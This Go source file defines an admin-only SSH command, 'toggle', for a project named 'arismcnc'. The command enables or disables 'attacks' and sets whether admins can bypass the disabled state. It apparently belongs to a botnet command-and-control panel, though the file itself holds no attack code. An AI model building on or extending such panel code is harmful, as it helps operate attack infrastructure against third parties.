package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"strings"

	"github.com/gliderlabs/ssh"
)

type ToggleCommand struct{}

func (c *ToggleCommand) Name() string {
	return "toggle"
}

func (c *ToggleCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	fmt.Fprintf(output, "Select what you want to Toggle (attacks): ")
	operation, err := utils.ReadLine(session)
	if err != nil {
		fmt.Fprintln(output, "\033[91mError reading input:\033[0m", err)
		return
	}

	switch operation {
	case "attacks":
		config, err := utils.LoadConfig("assets/config.json")
		if err != nil {
			fmt.Fprintln(output, "\033[91mError loading config:\033[0m", err)
			return
		}

		currentStatus := config.IsAttacksEnabled()
		var adminsCanBypass bool
		
		if currentStatus {
			fmt.Fprintf(output, "Admins can Bypass Disabled Attacks? (y/n): ")
			bypassInput, err := utils.ReadLine(session)
			if err != nil {
				fmt.Fprintln(output, "\033[91mError reading input:\033[0m", err)
				return
			}

			bypassInput = strings.ToLower(strings.TrimSpace(bypassInput))
			if bypassInput != "y" && bypassInput != "n" {
				fmt.Fprintln(output, "\033[91mInvalid input. Please enter 'y' or 'n'.\033[0m")
				return
			}

			adminsCanBypass = (bypassInput == "y")
			err = config.SetAdminsBypassDisabled(adminsCanBypass)
			if err != nil {
				fmt.Fprintln(output, "\033[91mFailed to set admin bypass setting:\033[0m", err)
				return
			}
		} else {
			adminsCanBypass = config.AdminsBypassDisabled()
		}

		err = config.ToggleAttacks()
		if err != nil {
			fmt.Fprintln(output, "\033[91mFailed to toggle attacks:\033[0m", err)
			return
		}

		newStatus := config.IsAttacksEnabled()
		status := "enabled"
		color := "\033[92m"

		if !newStatus {
			status = "disabled"
			color = "\033[91m"
			bypassInfo := "cannot"
			if adminsCanBypass {
				bypassInfo = "can"
			}
			fmt.Fprintf(output, "%sSuccessfully toggled attacks. Attacks are now %s. Admins %s bypass disabled attacks.\033[0m\n", color, status, bypassInfo)
		} else {
			fmt.Fprintf(output, "%sSuccessfully toggled attacks. Attacks are now %s.\033[0m\n", color, status)
		}

	default:
		fmt.Fprintln(output, "\033[91mInvalid option. Available options: attacks.\033[0m")
	}
}

func (c *ToggleCommand) AdminOnly() bool {
	return true
}

func (c *ToggleCommand) Aliases() []string {
	return []string{"manage", "enable", "disable"}
}

func init() {
	CommandMap["toggle"] = &ToggleCommand{}
}